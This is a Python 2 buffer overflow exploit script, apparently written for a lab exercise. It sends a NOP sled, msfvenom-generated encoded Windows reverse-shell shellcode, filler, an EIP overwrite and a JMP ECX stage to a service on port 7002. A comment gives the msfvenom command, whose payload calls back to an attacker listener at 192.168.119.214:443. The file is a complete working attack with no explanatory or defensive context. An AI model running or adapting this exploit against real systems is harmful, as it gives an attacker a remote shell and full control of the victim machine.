#!/usr/bin/python
import socket

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\x3b\x45"
shellcode = ("\xba\x90\xed\x90\xfb\xdb\xd9\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xef\xfc\x31\x57\x0e\x03\xc7\xe3\x72\x0e\x1b\x13\xf0"
"\xf1\xe3\xe4\x95\x78\x06\xd5\x95\x1f\x43\x46\x26\x6b\x01\x6b"
"\xcd\x39\xb1\xf8\xa3\x95\xb6\x49\x09\xc0\xf9\x4a\x22\x30\x98"
"\xc8\x39\x65\x7a\xf0\xf1\x78\x7b\x35\xef\x71\x29\xee\x7b\x27"
"\xdd\x9b\x36\xf4\x56\xd7\xd7\x7c\x8b\xa0\xd6\xad\x1a\xba\x80"
"\x6d\x9d\x6f\xb9\x27\x85\x6c\x84\xfe\x3e\x46\x72\x01\x96\x96"
"\x7b\xae\xd7\x16\x8e\xae\x10\x90\x71\xc5\x68\xe2\x0c\xde\xaf"
"\x98\xca\x6b\x2b\x3a\x98\xcc\x97\xba\x4d\x8a\x5c\xb0\x3a\xd8"
"\x3a\xd5\xbd\x0d\x31\xe1\x36\xb0\x95\x63\x0c\x97\x31\x2f\xd6"
"\xb6\x60\x95\xb9\xc7\x72\x76\x65\x62\xf9\x9b\x72\x1f\xa0\xf3"
"\xb7\x12\x5a\x04\xd0\x25\x29\x36\x7f\x9e\xa5\x7a\x08\x38\x32"
"\x7c\x23\xfc\xac\x83\xcc\xfd\xe5\x47\x98\xad\x9d\x6e\xa1\x25"
"\x5d\x8e\x74\xe9\x0d\x20\x27\x4a\xfd\x80\x97\x22\x17\x0f\xc7"
"\x53\x18\xc5\x60\xf9\xe3\x8e\x4e\x56\x9c\x98\x27\xa5\x62\x24"
"\x03\x20\x84\x4c\x63\x65\x1f\xf9\x1a\x2c\xeb\x98\xe3\xfa\x96"
"\x9b\x68\x09\x67\x55\x99\x64\x7b\x02\x69\x33\x21\x85\x76\xe9"
"\x4d\x49\xe4\x76\x8d\x04\x15\x21\xda\x41\xeb\x38\x8e\x7f\x52"
"\x93\xac\x7d\x02\xdc\x74\x5a\xf7\xe3\x75\x2f\x43\xc0\x65\xe9"
"\x4c\x4c\xd1\xa5\x1a\x1a\x8f\x03\xf5\xec\x79\xda\xaa\xa6\xed"
"\x9b\x80\x78\x6b\xa4\xcc\x0e\x93\x15\xb9\x56\xac\x9a\x2d\x5f"
"\xd5\xc6\xcd\xa0\x0c\x43\xfd\xea\x0c\xe2\x96\xb2\xc5\xb6\xfa"
"\x44\x30\xf4\x02\xc7\xb0\x85\xf0\xd7\xb1\x80\xbd\x5f\x2a\xf9"
"\xae\x35\x4c\xae\xcf\x1f")

try:
  print "\nSending evil buffer..."
  nop_sled = "\x90" * 64
  filler        = "A" * (2080 - len(nop_sled) - len(shellcode))
  eip           = "\x3d\x11\x80\x14" # 0x1480113d
  first_stage   = "\xff\xe1" # JMP ECX -> ffe1
  nop_pad       = "\x90" * 10

  inputBuffer = nop_sled + shellcode + filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7002))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"